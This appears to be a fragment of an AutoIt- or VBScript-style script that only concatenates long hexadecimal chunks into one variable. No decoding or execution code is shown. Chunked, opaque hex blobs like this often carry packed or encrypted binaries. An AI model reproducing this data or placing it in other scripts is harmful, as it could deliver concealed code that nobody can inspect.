	$j = $j & "755D0DF5DAFA89062169FE03F2AAA8DFB8AECF7BA008AD6F187EA67F3955A876ADF04722BC8730344639934D42DA5DDF140BB967C13D9DF2B96FFF3AF6D9250D9740DA13927963687C45A116648A88A4CAAF4D69EF271D09DABD210805419FA57B9325CE794B5A915D082500923363D313BE4206AA579264602DFFC8BC5652D1A81675E42C081273DF4931B46F1143BD863016AB1B74"
	$j = $j & "1BAC9C5AD43B761E51089161493357D3856C9695B495E918094C8BADD3BAB761DD05D636D7D02B0F2738098CA21586F6D0670B6963238FD31D39DF35D9921E2C5DA54009E46952CECA6C175D711EAF7180E7D2A3155A76832161A00B60C0E8AB7C6CDBC7D67AD0CFA1D534C6EFD51940C7A10AF72DECD8F1159C61A4D217A6F0EA92320A762155C7F5D7BF29EFEA9E467028FECE96F5"
	$j = $j & "72F89D1C9E71913A3227D032E04DC6395C790D0CE933D8330D755ADF5404B0F20C9209F70BDB0C38E3DA482B0446F3433E9D18B5763DD94DE67FD7450F12DEAE96605B11313325593DACC1EDA35F9D91D86B719D6E8ABC67DA08BCB2E324AB3B3C3B835FD8B6F74CA3D85FA731DA02BB62CBEA7859CCD560E0086E94FD4B30AF8F2DDCF45CAF78BA6136D84E4ACEBE962569A3AFF0C9"
	$j = $j & "2FA17C4643D113DF637CC8A5699391E487ED8955B3BDA32AB924DB850CD379FA77EE13ED2278F58063EFEBB84695C0A8D7BBAB08844C2224F345334C4441B411EA34A189838E710585042956AC3D1C541AC7B5B7492E4E4368FD917BF1F3BBA9141F353017BE0F1A5B2BBCD5AA96D6B1339FD3BE7D735668AC43F078CF9CED425BF34560C382FBE0E92FCAA18AD9C18385F24F7AF513"
	$j = $j & "FCF5B60C5127745ADFF09A8228B99D2143E0542BA4E69ED7373E64B1636F06162E569C0A24B13BD1C3177BBA23825EBB3D46EFC2EFFB09DDF6D604FA2353A52E9E30C8C003822E17D8C506BF7C1F299502E74C5C54C52E6ED15AE1AC4220EE820B7013EB24A80FEDDA291FE8ED27D98EDACCAE19ECB675865165BE77E38ED2958FF8C047F17761887FBD00D312B3A3EF3F259CCADBE5"
	$j = $j & "20D71830103610DBCC4CE8542306EE8C4484AEF04113276627F1EDA2390E8D6BDB40433154B801C31D5D79C79D613043D078D72F72D7DEAF77C8D4322B67D01EB920CE9665B33B671BCEC2F2F1FAD63C86C0ABA87F17289E560685C90467D60BBB2091F5E0334437E3A0F8FFD32D562F606E59BDEF3EBA29D7C1D3BDAF07D95FE96EE63AF9AC30FFAB267978A559A0DF3F3B58DEB707"
	$j = $j & "7E090FE0A41FE7C9358290FA36DEBC07D6E55EFC74C19478CFDA1C82723E319E528BD572676A6322026003F4A465534DD54D7930185FCC5A4D83DB28385C8C4634EAFF6C9F9FF14A725DDF047EBB46B5CCFC632E70C00F275AB6FB49C9EE8F295E2D7E890B21FE38C5C091864F0790595A7918352DA836E00B79ABACC211F9AF800C4F789D21B3D13F5D0151AB3A694EA5DEF1695F6A"
	$j = $j & "798F450F2B957F84CCA32EAB2CA7E8FFF874BCAD723850A6AAFCE5A26E3A2DC462341BD4C0199FE1E55772AB8797FA1BA31A3EDE01CF8C7D20B033E03EE00FB41FFB2034CA71128E2580EB888CC7CCAA0954B7E8979C90D9BFF0A8D7F5C9F16DD5C56798A54B460846BF749787EA27772F6C431A83AF7EB9E106746FBD1FC1CB04390E7FE207CBF650CC441C7A0E473C5F32B3C2AB42"
	$j = $j & "552297C3770522CFAB4E48EEE1DD4FB2FA15A228E1A90024F9FBF8EBBA23AFF15676E4689893C8AD34DEF421A210C71969F3D9FC4AA7420A8A0563768DD7F3194D249BF6D0A2A540CA2430338F8D5A18A207F5F9FB2B783B11A22C2EF84FF5F26F0AB2D6B10603AB0E3A8ACED67A0903D3E03A8C9CDC3F87B493C090C379A1327521A6A5ED2E02AA327080DFEF592EC229A883E09A40"
	$j = $j & "789B4DFA50F925037C4319614CF1D1292F2309B56F211D9F9377E6A95FBB35A26C7D6A037B4DFFB442611B6F5D138698DB3B80B209E39EF6256E46733200B691012930F340029667D1A5CDD59F317F4A31F79F19DC745417F334E3E17AF841E8232C51F41E84146451FC381A9AEBCCD5E7F3921598ABF67027F56576D6E41FF097555B084007D9824F6FE71583D808DBEE974CCC29DE"
	$j = $j & "3FE63DBAD44321D6C777D5795A308D341FFAF9595BE6407E1B15B86F614FBEE474CDA17BE39197C367D6BE4CDC88F31AEB1528ACC696DBE9BA1093946EAFB1C1EBDDE970E7F832E1F6A479D2EC4A067892478FEC5E2DA10E336CB4F8933B3BF0278D1392A9B5DCCC2EF9FAE93CCEF81BC72F35669A0702E84D3C0497AC43E4899A05C2036ED53DA3ADCDBA0417B70D5E5132162FC003"
	$j = $j & "5E486B265E7489295D5B4822452D457A7DEF4701DDC922D0168032BC702C82B24E53F10517285AD6DA93AD90B146724EF008B40F9304F7F2394A78926F12C70070345AD2B2D8762C428304BD55CC13C6A2E265F5829A6EF35C49516B33E207116900F7783A587DC5A9D60B93EBF124EE7207886D27DA3568D9F793579CE9FC2C9EDE5BE6640A15A217082DC27C9EE871B407DA5AC5FD"
	$j = $j & "9BAE2F0CBAA841E03EA9EE2E6DC308EC259C493B1D62D8DEC78809F22E213900DE309563683465092687D609F4FE0F0B99AB5B3A469AD05177BF0D59770F14BFCD88685A9A8C224F8AC7131F5C70C909E4E6BA25F118F6FA5E3D87D14BBC691638B07DCCBAEAAB2D2E8DB64629CEA5A9475FFEBA9AA9FEA98C38FF1D4114455411D9DA5A59E342C27EFB20B6C01F8B45189A20DE3461"
	$j = $j & "09C7D62FF04084598A0D722A79BAD0D3D58A2B7690C28A47FDE52A97E7BC2096212C2EFE60DDC3953517BEBD7DF1DF95788E6728A8CCCBC4965A0786364DA30BA505B6C0D8E6B0C86F24C8ED6BB196CE0AB4B73D31626C89166A44C5BD988E70EF5EC898D5C809B97BA72F6A44068B211E36B809F30ACD5689C1CF709E08E122F3C18209D3C50DC79714D13A077EB287FD1CEA96B1D0"
	$j = $j & "36763AD771A33CA4D9B402954B57F0442B2F79FC9D7045CF1E6C33CFEF718D708A0C203D25815844A425ADFBDC92578F0D187C2F179AE975D901F2A39253F4B1B40177CB2EE522714FCA5BBAEA3E79E63867A5A3ADB9546E183C153CFD1E4AF17520B9A1C2845EF1B64D3FECDF60B3B03C98A9C6867411188E03DF6BC92207D0EB5D2245F56FF69205F250434083887AD53CF9A28B33"
	$j = $j & "D57E19E1A08799225B60A1BA64A9ABBA07D268638E0AF138CA2484E1098026DA1DC9A0334457A533BBA57CF7395306054CA504F641CA346D841284280BE9A56C4445DA3271EADBEE89682A069FE07AA8B7D1E03F291BB0BB900D7BD7F66961B7E7AC95C09553531A0A1B6E0405C62E579F0328415A688ACDEA8A393DE1CA237B4FB89CA4AA8FB8900EFA9DA01542810AC9DA73B7ED51"
	$j = $j & "99ED378FA1AB154E7C534819144B2DB3E17E1183CA3014806D857D298A47F03EC435FF56B89F7C04AA748E3AC40EF6B02DAA97B6CD4607A6F452D0750226C1FF2FD9DBE8ED429F8B02CF381DEC723E8717C5D91A67DC9152AA0B9DD0A860207A8955BD321DDCAE416344761A6A4C158B0140CBD7D50801D5A4AFE8F7D95DCD70A31720B20BB16F26148C3DC75100183DCD72E0324DF1"
	$j = $j & "E511C8A5D09350A1B68B5645B0860C3D953618A8A031064A4EF48F1438941632B5D8112B03FE9CAACC36453AAAB301F9B46DE0CBF4E4E652722D1A031CC36C48472856104058D86184A8691949674D8652DE14169A58125B2B95AF7027D7661D88262CEAFCC8DB88D1B0E755978F6A575A9FFFD681154BD89EA6D4D2688F47F54294A2F2D27DF65C2B349AA7E364D8295E1F468D3E25"
	$j = $j & "248C4B9EE441C6B679F2C4EAEC7452DF99C9429EE046F54D91AB06B9A8E5A397457E2EEB9BBF6079D4BC9508A1BA6F0BF5D64C2C19B26B54EAFB769AAF8D8881528D41979C0645C7980DC96D1FFB7AF5C5421E25DDEDEE1B55215C2EEB935BFBCAD7F352738DB8F6FEB152F25C28E2D45D68834245A15414A391DAA64E2978CD67B0E085A844BCEDE01DAE9106CC6FD90173E4B335A3"
	$j = $j & "E49654E1A82BE32A633BCE141E03D7E210A1792A262263AEE498A8CC93DB32E784D26F9DD3E04E82D1D9EC2D365E123170DD398DFA9C264854EDD5123EBA472C100F0D6EE6F6A351E53BDCE9B1CE0FEAAAFD09D89BCFBCF81A796136C339C4E940C40B994EFD6B6A207A8589D317B43D0E546269E4A468ACE6ED5437B801530268FA5890F8A53C533BD8AEBF1F6C4EA018F17A499B95"
	$j = $j & "2E6B0E7867409D85AF72AB49B9B378A8921568FBBEE0FB0F0D1E101E6CF52DEB2A2CF5374111BE07E5E22211DBAA2334A04A97945FFB1BA8552A874771CE922C8668261AF93B99B871B810F2AD0D12319982E5CA758C14E12D035F3D3A6F905076330AF4818ADB5D31B565E0790F377DFA568E334D8B3BBCE26DCB2674B2A8D8A97C384CBA186F083363DA3039EBEC4C8E62176B45F2"
	$j = $j & "F121D2076BA93CB9ECA3D3E70CE961C357433C41D167F55DE14250C0DEEA9B56305BBBB658FACED5DD4887CAADAB5C6B621CACDE9C0B74FC093DE053EAEDD02D89A491F3F5A7F710019EE44EB8ADF6137F3B2A98FC96F6EA7DB9BDC406BF883A08B9C86F8D790B0C5ADCD8BDE85E67127229725234078F9801FF84B9FE5B4EE8965AE3654A1B123A01EFFED7A4676573634B4DFB54FF"
	$j = $j & "C8905FF2A699D3B4E158A40C2D04D8E9E59EEAA58E9F025B6ED49B2784115D98F8DBB65DE4E5D8EFF5D0DC34A2E2924DF46BAEAE4EBE7C219FA619AE51A26FC801E7987633B6D1E5CDF69938F1D807FDF43D67B9455D734C7F826E1F2983FE11155856DC89791C663EB79098A62A1EC507204175043C54439DB350967F3131FE8F2F839D60D276FD9346B2D6ECA92A97023548C708B6"
	$j = $j & "BDE24B26B599B88D0BFDE1F645E93DFED80C3C120E5E9E67F6A9B88510CAD7AF0ABDF6E06DD0911479F2E597FD2AA5FED7415D2AE54A2FB2EF12DCAE3ADD6BBB635778142B1462A777D4B79AD41644FF6F4753E4F4F66E3FA4BE5F8572F72B550B822AA380A99E55C7B1032AFB4677B7F65420C0DC8A8A307A6AF4F50679BBA0C98939047DED50F9863819DC88B57E8963FD1EC15971"
	$j = $j & "44109F7AD9B6C73C72F25FFC431E2DA8FA54914652A4662BF29B1C7ECFC7F2CB8DDDDC6C890822DA29E0137EEB945FE91EF6D6EF94612FD50484A1C0DB20AEA4B6FBA40B9F7DA69CEED13283DF375A90D7F9295108FA186C9F3701122AEA59455EC6C35F6EC1BF13458123AB307F6518C2842F775317861ECEDDF89BC8D2051FE1D42E311DC282FBF42F19BCDF6D8ADBFE83AE24C025"
	$j = $j & "C53FC63A669ED6DB570B96D542B075822B664857998CE31B2300AA5FDC4CC296AF1C75A06EAA78C0FB853FA7EFFC7095542BDE2656ED035958939ECF1496666210BB9BA7F5AB1D4C4C217DB5D4647439F95D8945CBD017181936ADB552F81CB9BB92159F901F70627D5B77B548DF9E2B20C04BD81EEF8637F759AE1EDBD2730E11ADB1120EBEF7AED08B1CEC41B7E6A33180CE8E63D0"
	$j = $j & "4142E61527DD2B45F5659CBD6095989443E4B7C098055A9F63A874246CD3CBC6E72CD64A8C85B94425CDDFB09760D68E5F3E211FF36B0FAAE4A7B033CE7E8ADBCE8222EBA370B94F0823405E2E2990B2776D5722755D36B59532AAA449B9E3358D60B2DE679C4C7AD8B00AD624EAAD37E9089C6AB7041CA6118753E26472D490A81603D003CA851EB411B9B30017527033AB514AFFA5"
	$j = $j & "540F0C708B310DC308F134D7A1F3FE885FD91D64CAE38DBA6C61670685CDDCE5D02E40EDE030BF26C8674C6A553460B67DAC9E2222744A84399DAB5866AEB550562C8407AF56F3C4AD37D3D59BC748519E80F9C7D6B4B24FF47A4AC7D94ECF030AD8016BBB62C4310F15B8E51BB8068CF5639A5AF489C1F60E1BBCBD599C8382A12BBDE3AA3DB9B22A2F3BFD69788162D960D34F5395"
	$j = $j & "3F340EA9EF331B4434C5391857383C0B030F38F92853089248D7F4AF08506096D72DF283053C4FEF8A5ABA5B75FBE1AA1FF2B0BF8D38699918D73156B0E0ECC4EAF72B7DA176022C5B22472541E4543FA968ED301C11E20DC8CC8DC628CEF27CDCD16BA10D395900D60276232787B509E1C37FB9EE1D45B0BBE2B8D764AA845CD0A3F42522A8759B3E9133AE5406E67E256D16C20E07"
	$j = $j & "0C2FB7C5CE030D5FDE496E1B711FDB38C72248DDF1CD78128C8B618B6CB071DAA1C43C3A86BC33A4703CB71C050FB84A0174E472AE8DC1697CBB4352F9912988583D662710188F525F63D81A944871496235E843E0E05DE9E314D6510790076064A5E82AF5076535CD13B77E54A82E1D2F2B9BDC4FB7F4E95CC54FC6F596B782D50BA373DE7D6BDA72E9E65EE24F6CE883FB29BA7A94"
	$j = $j & "9FF80D0A21094E9B3C9FAEBA5674AB2EF5DF94F50918F8029008AF7CBC2861E9F4C68F870F0630F37B0373C2DBD06D99C1547CFED4EC593BF462F84A840769DD7A53CA32CF244EACB2002930F9476AA7E44ECCEB1976497624B6B80D8AEA7014A95F395D2EE64BA3583757C41444FF3099D6A99FF0EC315B401054DDCAFAB0C3ABD3BD998F19E9DB979D887F7E6B6BFDA924D6062D97"
	$j = $j & "9E564F11E9C637133A126001E3F8B51A48989F20D3BD39C2AD899E44F759E771DD65C659CD8D854CB36B14D81C1E034D419D65B9169276058DE350519488EC9E310305F5EA87046B1022DC705F62402CE67F516B360387B1CDF9269C5A9C8BE954BDAAB606D30F414860A928DE0D48A9A8A94A115BAD6E2A3F522AC7E4BD544B62B8CEA5B51726A5DE85AC2A1708C466C86D96BCD897"
	$j = $j & "40CD3014D62B1EA18DABA2E1B393551C28D965B05218795EF71B10A03BF71C15ED074ED4EB4ED0E4A7B9F0875B386F5FABD3C510E7681F90694CB5E7577062678969307F0A0086E2FAA710B65F6A834E4F1A6AE46656321C62FFADF2335038C3F38C06EFB04A989208D26E8FA641B614D5965C8A14D55CB132C57BBF67381930AAC0507BEE1AB7E9B640503EF976F5C8791CDD5D3214"
	$j = $j & "656F6A45966335ED9CB3D502FBAFE8841FD3B1DC496EAF08A23BA674C41800B5A93703E55D1EF8BAD1F7E5BDF9B4962F2356CB0B1CA1107256EA6FD501E72794140D2C779BFB96196AA4BBB53D8A95636C4CC2F5FCBAA0D3D96E01BECF071FB6072C606E3BDDC14AE0B8C040C2EEFC9DD79B27ADF7E9AF418331234ADBA9ED3619FD074F21EBBBAF634273984A0A14ADC7845683DF81"
	$j = $j & "F26A6359674B36CB5668A9852A7162A14A729EDE4DA70E8928C38450D3785142F9097CEC4C661604E2272169183DBBF457A392D651B3595CA1B151DC34BCE020B08401375025FD29BFD2977A97FF6CDE70A1CE3B3B1A90F65ABE35027154760262AB99BFB1EE237A3ADA81BB7A683F8E6080F687912E475E9F86C6FD7250EE5F32FE65CB7AF7AAF9A9E919FDA26509C2E91FE98814F1"
	$j = $j & "84AD4C692758900CBE432A41362E72EAC04421764723C24759938F17A5BC3ED77A46E1A5945B5FC1FFFB5BA8320B01440CD64007449F80F93A7741B4607D0A7CA0D6DFD9FA62D70BBAD1E15BF486E9FD335AB710C46785705414C7187BC9D5AF9C2F976235996D342D0D5D5CCEF2B359A44D4A2896C2E9383A1FC0EEB6CF0EB49516C4DD5322724219C1529F020422FE9C3B9C13E0DD"
	$j = $j & "35332115F2E643FFAE535B84AA0BEEA9F0CF0675D5D1ADCBD9B1612428AF8D33CA1EFA7F4F304200CFBF8012EE72A6754F34BE7F9346970E058E0D3F4894C678C333E98E5B0D418B74F59FFCC5BB5599AC3B54EDD89658C7206DB18E4963015ED39A0EBAA72B1C1CCCBD806AD678C511C679D4EF24BA58542EC57D0D366C93327B85ACEA627FCDD3E5AFB57B0319450BB0A357F6B62A"
	$j = $j & "DD49D7F5EBCA7A1B4F40CB1EC1BA1B1387AD17BD76981A089E4BF5F859BA6E07362BD8F4D9C7CE95EAFA98EF744941F076E9B572C373F040B08EAE078B1B164F94437E25E110FF21C832582EE57E938CA762C4C5CA043AA0EE803B8F3B90B366E922EEE6CC301A3BB5BF7A776F826C5930356EB51D34BF7A158CAF5D18708E1EE996CEDDE9F91C7E108960667D2DE27C52359568B9AF"
	$j = $j & "C4DF6B02E39290B67D9AA8A7074C25D95E3531B4437BF6F5BB501536086D4A65A2BBCB6A5460385F35D191568ABB08119C2F48C73080C54437303C12240C69B1D2068A22F1C462C61F245A7053C23350E7AE9BCBAEC310624C5EE7D053ABD874F428568823DF4F04052CEA57F4BFF4F64A4A0F8DA82B6927D2109EDE5C5E6B22C59D4C99F9B1CD1A3733F200E0254727EAE2004315F9"
	$j = $j & "C90BFB2F05A83C3301570008C25DFE83DEA13A1F98E8F6359992296F728D6ADB349C42252C3D3D01F9F094E3B8A9BE46C3D9A8787E1771A87DF3573CC357A7DB3D65F5C41A7C79C20076E3D9AAD0E381DFAA9AFBAD591642670766878B0ACEBDBA8104C959849341AE414473645F1D3C2EB5CBDF6D545214F6D18CFC261E9B31D316F9DF5158BA55B3C7E1ACA722A584F251EF7ADC74"
	$j = $j & "69E5B873A66669BCF17902350B59CB9E647A9C9AB1D8C29B6D8AC339AA599B800CFDDABA53DAD6BCAA7BE7CABD567FE271B0C6ED46AE28D98A9BB94A99C6F4C024CEE4CEB2DC2E2AEE920C7807A6C55C681937294E9ECF9E62D7790A781979601BC91E29605FFE91075A807A5CA240942B34B1DEFCD68699DA18DA07B629FF9A712843A8BA72FD0597160A3A417821079267CC0757D6"
	$j = $j & "E2A1FDCE03717FAD64F0B960ECFAB37A6A41DE91D4112D8B29A14B97C0215F296DE2C5710C96BE79E005EDB1C9F9AF72AF3E5ABD5756F23FCD0041C20CA953FA62210BD0E67C03D0430F42BA07CC44F730E6C6AE27731302C1A5F012103C2C11F0F242A5E082C949F0B1CAC8A902FF954DBB1CF6C1159363845988B3217977BD5EDAB1025CFC7C9F6C2C1C66F8D20CCF457A9D32D124"
	$j = $j & "A430F885F4B75506BC6C71E7ED3D9D3571AAF03562F8642CA3F07A0DA8891A53DF3B30B3782DDC286C740CFF79C168185D8F07B31A7D15C04DAC4161063C92C35357332CE5AC4640075B19F464CB46086A074372A5F70540FFC7C8B8425C54DD4C49F965C2B00E9DCDBD8A783323B922D8DE05267FD1CAAE8C66EF81602EF484311629A1D3341B21EDA818EBDA87D8AE42A2107038AE"
	$j = $j & "CDB6F881C1FCCEF76CC08AE3F6B78885969CBA91200D52AC86E05A470DBFD9597124CA1FB2C4F6D09AC8F8BE5689F908296800B35C4DD8ABB02E561EAA984B3F2C34706546246A13C4726C5C446947AD9ADA5B751A22F248BA569587CB1BEA284B930621CDBF8ECFE55491E33A4E029BCDD0B8C258D2D8DCC284E22820BAE82AA4542E5B9DC8F7D7A9260BD34FE888EAB7FBBAECB97D"
	$j = $j & "1EE19F135882B759ECCF90E22262BCA5EBC968D0DCED975BF70BC8BA2BB6466B389829A0D4B37E063960FA75A83A4D191F0A29C6CCD32871533447C20A955E29BE11C943E3F4D1D80B10327361DB0E22C60350BC9DF20B6902D5A498615F768D15602514379E508D8EF842D7409315E0D80A4DE6546F47ADD3FDABD8AD7822C76E939B3C1D2935DEA164C315D920DDC5122A2D2E05DE"
	$j = $j & "5B3C1FC5EE6671339E8C30110F4486C8636FC1C8F4835592B72C57E367E7B90DE662159DF22762159DF620D383E4F95AF6E6564E1FBB4A819DC7E2727BB72B0D8B8C0B224D10D71ABB97021082330108FD3714B4B3E38F529FB765412C6ADAADA19245A711720999825512059E4D34A4A7C11E8469F98AA046E565973FB967A363FBE723B7DFC807FE4F24CE18B7F623FF438A37DBEA"
	$j = $j & "5A51275BAF9DBCFD3B831B060B1DB4E3C62C01CBC34E7096F313D440C33B297CE72A349B53EE4E517710D445C53043E043E23D4844A8D4E25AF54C59F4332B48D1172D4AA875C9F9905902CB899D753FE575B3200F5F0BAE7BC9767FF663F68D50670B26C680C52FB830A2CDCDB86D3DD7824D1E78A888B0E9FFE4958A38BF137CCEB2677C8ED5FBCB319FC9D4FC0EA38C32E456411A"
	$j = $j & "7FAF8F7B0A882BE7EFFCFCCD7DF10B5D321DE1623C45ED1D02D7B59E0BE6BDE05C3F571F0583EB63BC6B01DB94AF9BD419BC10B2556B223F70FCB212D26DC67EA074F109452EE376EF19406D6F6D2EC08C5174BED4B05C5CD33900D33D6547EC34492086DE757A1F7791809BFEA13B65A3841779F7422E3BCD5815E6147431A28FC228DA566E03B88ED1EB472C86C00BE74DEB07AF56"
	$j = $j & "A0552EC85EF3F452C3B607BED47B7084857495A78455671C55EA48ACE27F550AAF648A8119C23242B2A974B1CA4731D968F506010BA0C435B5A793FA6B4C6A0752C7403D75A8F69962A7061C7925678CA55EBFD1EA02F8B9767942EA60F05FACE72527D7431124EC3D61C355746070FD0620036AC0E986D20DC98CE06717F2FA93B70B2B48CA311F30282C339AA3B04B49C526084DA4"
	$j = $j & "0222BE1408AE86B31F3BA973F400756FB1881D56793226F682649D101DBCE894847B09A048D853B27F7FCD8A0B3219DC10422A9728B9D5956BAE916B94E3F896911D5F3161BE616A3F5E76EFAC376104EA765BBEA8F9F5B0E952A402C81BD170D94B7E9C79655621213D8FE57174399BEFB399C48276CC549A5CA7C24DDB58D20FD117741F32604672D6AD3D31E608DFEA6E097EFCD6"
	$j = $j & "46AB4CAF281945B7A46C5FC8D48150D13FE689906A9E715E3BE1CEF1B777057A42BD75725E96660DBC10FFD172DDD2E2D46F7E426937BDE0FB7F449593494A12D0A919BEBC7555D1477E3F012E69195B64D318901ED37E0D1326FB167BD7FF44E11D506283D5A2D424CB994D41050767DDF37CA45D77334CD46AEDDDF22AFEF3C525296FE3C4E65D8FD1B0900B4353F96AF7ED55C36B"
	$j = $j & "5050DBE22EC0ADB157A173474EEE69247A1C6940022F365CBA86B41904315882CE234403433957BBADB07D1A899A6C15FD617785B5D95509478BEC614E82ECCFF9A600C9C1345997EFB487B0FDBB46F72D0E6243FE358E319270C7B68E5E9D384046FF6864D5DB1C0ED119779BE09DDE0E7053CD2EA7167DA849E1A5B4AE5041E877B98AA8DFF3599C679AB5FF50A645250A1F6B2EDE"
	$j = $j & "998D7FD5B4F1090333BE052B9160C2751AE25F87B17DB41B2B613B958B72845ADEC61C8E35122920C0AF5ADDF5C9E6C93AC47B1B3FCBB888AC897F11A06233746FC5C8640CA04C9FE08F1B915861EC818F030F464326CA572B1CA9F9BA16D638313441FE799EA79C1EB70CA93F1B2FD6CA059A403D5216ED471E17EA82DA5C7C4FEBFB53A8B4756F030EA5E70E394FBC0C6FBFB89E3B"
	$j = $j & "D65144E8BA01D73D0597810EDEA494F930C8E7540EC78DFEFF29D05F761BBA67232FD205548A4F968BF43C37E1E1D47ACA57ADCF909DB6F68ED2F41692E5B6CBB46A2D5B0CF1F860FBC10E4AB9FC64A5061EA7051B63844FCA6A856F03E87EF82973097A91FBCE837A71839925AF3DF88977086769585BD2BCD88A4E8AFC67AAB2C09221263513B9AFAE1153BC961A4FCE8B2EFB5D0D"
	$j = $j & "8C6B79120D0079F28E2E89DAFBE160E2865FEFC081F25BE18C537E1DD7DC19560F1138E11E148C6B3D8C74FDCBB36DE84385CC57E5F0DED94ABD00C4EC34CBDFCF255CF54E0AB4711A6854136CCD2D750B89A963F72B6BDF6B2F24F7D812E3F5C5BDA99AAA51D94C8B63E00E21D3A171E99FF3F3C4C0BFE781CEB1282557E978FA72A2AFF239B730D0BA3CD50328570B0D5AB70A2027"
	$j = $j & "329D93A79A84253C111327913E58F8BD4678C798B38C0842BDF6B22A05EA5048863A87F5790A4D9BBD49A852C0FFB787686DD88419FF8394C81A0B79780ABF8D166E2DC0D68F839AEC3F1A7F42FA43B7F2681D5F3FF67DD81E0716473DDFB88163F5BEB37D3DEC913E896D79B1D85426570CE4800C5DAB70EE15963806AD7866D15366443D9703B90BF7AE745E83820F6262F562B45F"
	$j = $j & "73095543510EC383B131DF76E2F05CF17BD27E5DD85F869512F20FE348D09B2E992E418E426A199DA655B17BCA64F1106F439C46E0E98F848DD762AAFE0368B801893432697A53F3F80827B2A9856D0E4135AA45CE240B1843F4B9077DBEDAF3E90BB02F9716BA8826A0937EE417F100E6BB331E9BE2FBED484E6E62CF81C51976EE9D05C309A727EE733BC52A768F4F1E18D94AF207"
	$j = $j & "F000FEF3E5B3D4E7C48F56A32356AD5C42B0A8D72EF1A1321B9D0F9E6DB6A75399E39867215CAA52FFED1B131A02C866087F8D96EF1D255DE349064DC040D1ED1150DEEB50558A2FE87FCF8F19424B9963E4DEAB03D98C0D27878EC902A364B98913D8F039A55A28427B9DC7BE90311735FC701D00530D444F4738258184B0F61430A82374826ADFA14E5FA9F07ED8BC56421952CBB8"
	$j = $j & "D626665AD202818A2C1DDCBAAEEC95610EE802C3F26AB2D01DDD7CEFDEE0623F9897806D1061D7737F40B344406A199A7B031003EABB6D93D34866299E1F4A624FA85DEFB34CF2BF0AAFA6BA3D65EC1AD52F911651B2C9CB1CE0E39EB8527D3A7DB00C978D155A24DC8698870D256DA417FED3107E191AB612F38D4CFEBD06A8987BC4C324EF27F000B19DDCC35E022BBB6E0641521C"
	$j = $j & "87F1B19478C9D790FCD1C41FC2033EDDA02B8E723DCE86877382B7A7BFA7504803DEE185F47F9E31E70FB890B2854D72B62486EAF6CB2D48E3350690623DF755A55AC8672AA8FFD6B59EE1CBBEC0A0FC8505826A80D954852A0FFD1B548376A2480458086E36288846E1FDD11CC360E793C161450C6626F8DB70ED94A58E66703C339E04D7A2D8BDA8B4DF386CAD4E69994A86F45472"
	$j = $j & "F99C96976E1506E9D90C6A6592D0EC5FA704BAFCB6CFCBF347B1A26E270D00A89BB9A190AFCE78C1D678C5F13F428C16FAC197013FF8BB3F9F79BE06BD8837A30672883C11ACD50DB8E227DD1B5B7A2BD4AC1E3C0D79CA54B03655598A95F8D1458BA4894E3BEF7149A3CF6181CEC21F1A43B1465EAFA7BBAC27C641FF7AAC36B683A0ECE21C630382D1A851BB6C6A0A422E3915BC03"
	$j = $j & "36C44C86F24F26E987F297BC7F5DD30E460904CB9CEF02B54D5C812B137E6384AFFBE5092E113CB392701BDF3C4954B63F4B272598CCA10D9269A4C460DF3BFF16232FA685F428C3418417273EDAAEA59364D72A760E00924BBA9847C092C9B299C7D85C8AEF56220F2806E0F06B3051A03903F38561EC7B8D3ADD41AE4CB8B32FAE3220380467560C03CF6A3071B222F2F2806A1A36"
	$j = $j & "2AFBF68557C6D59D301C89BBABB64083341207FE8800CF93F18E3D263C2B21657B52FBA5789A17D24E47ADD177F304E7540E6905F1EB7403F1FCB3F507F732FABEAB7D9DDFDB8B04D5B7D2FA4F2686966C4F6A57EF060F8D8A609141176598CCF45217812EEB3C254574CB785393C6160B854323FF233AB6CF623C8F53DCDA510333E1368003598871259C79FF4B22344F76122051B6"
	$j = $j & "8253EC40EA3932599F86468833636ED5A77E28C3794208B66C5D8B6232A34B8F866DDFEFCFA4FA8A99A5F7AC8E0F06A53CD47EFDB9D1B1FA4D0BF9D2FB5D2D21760362E809F8A6F28B7D24024B53262ABD26309F3EE77438B832870148AAE25A4ECD1A1D812BC5536C91EC73F55606CFD793FE6BE905D9F52C83E115C62BEB5E539CA38E299ED84FB6A503BECA332E8A25FF03B67C15"
	$j = $j & "4818B498B0312720F048613DDD9F9D3E85F6F54EBDD956A9F6658FDFB30BEB9542ED7188FEAC8921B9999DD87E0B22CF854EDDBD2386F26477854DB91D4A53C499786EF619E601CA524ABCB0F5F45C47A4C239DDC4433AC40A14742958F7B76CEEC6E5F8346A625CF89DB7ED9D724E0A3AD91DA713D1DACEA0C61CFAD107ADD4982718763037C6BEB2017BF739AE0E4133602D1DA03E"
	$j = $j & "29875BEBE0E8965C18809CCC1CE50E3E420179ABB2146DBBEC812F7308EACEAAAA539B53B799E174406280F2C3B43BAC57BF7352538D77D89DF79B825CE9A2E19BFC5C99A378E0833BD42E018BF9D84DC10BB62E5D0C1F550D4FAB5CCA9904E728A319B843B19A7805872B00E824CE5B0FC01E3E42BA3336B43A375140F92E951F4FA01215C40677C66CA8C134E0893FC5BA8D2FAD55"
	$j = $j & "CEB86389A7C2F78E25B05ADE2FBA0DDCC2D28B82E1047B92822AAB18020934E639CA52767EEC88D167783DFBF18FEE3ED3D2EF29454046A873D62A8B646686F5827357281EDE2381423DFBA6CE5EE699940B75B892A755188D7C67E9CC47D76274D83D470C0B09D31C93B94F5EB34243C8D206A2A0C87B9A0669A3370B00D9F0E16766C4F6CE1A56D5C796347FC78C38DC4DC667E495"
	$j = $j & "C4A89CA7AC14273DBA8AE30F752DED0D2EE593BC8324C242780C68DF69B95D747412273C085B7CB40BAFE19833D59F8B484AA67F40FA56391E78504B670B3FD55BC59955D6D89FC0109F5257B3ABCF0C916F34F79981EDD9EE3FA04E97D9372DB2F8E8141AA84B22C0AB31D14B9CA4A934A8F8F13E0213D58B15C1108B9CD22FF81348D0EFD59554114783378478C41149E25AF06A26"
	$j = $j & "9E97811620063675E7C8017CDC5406E6F7BCB66B89F675AF0CBFCB6BFB9E4684D4E7C63E9DC23D4898C4FF98C0632242E9995C91F734B6F310480773F6CA9E0BC45EAADB9F14F73A5A8074E4C003379EF69B9FC193AD33102809F1390003E2C3099B2C0446B6412CCB98C50F331AF6802BDA892E78272EA578F778EF2BE87E3D8B55E4D3CC50903B25241E4F0D2305A7B14473064BFC"
